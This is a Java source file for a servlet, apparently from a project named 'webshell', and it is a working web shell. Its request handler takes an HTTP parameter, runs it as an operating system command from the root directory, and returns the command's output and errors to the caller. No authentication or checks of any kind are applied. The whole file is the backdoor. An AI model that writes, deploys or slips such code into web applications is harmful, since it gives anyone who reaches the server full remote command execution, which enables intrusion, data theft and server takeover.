package me.nixing.webshell.servlet;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;


/**
 * Servlet implementation class SHServlet
 */
public class SHServlet extends HttpServlet {

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		
		String sh = request.getParameter("sh");
		Process process = Runtime.getRuntime().exec(sh,null,new File("/"));
		InputStream in = process.getInputStream();
		InputStream errorStream = process.getErrorStream();
		byte[] b = new byte[1024];
		int read = 0;
		StringBuilder builder = new StringBuilder();
		ServletOutputStream out = response.getOutputStream();
		while((read = in.read(b))!=-1){
			out.write(b, 0, read);
		}
		in.close();
		byte[] b1 = new byte[1024];
		int read1 = 0;
		while((read1 = errorStream.read(b1))!=-1){
			out.write(b1, 0, read1);
		}

	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		doGet(request, response);
	}

}
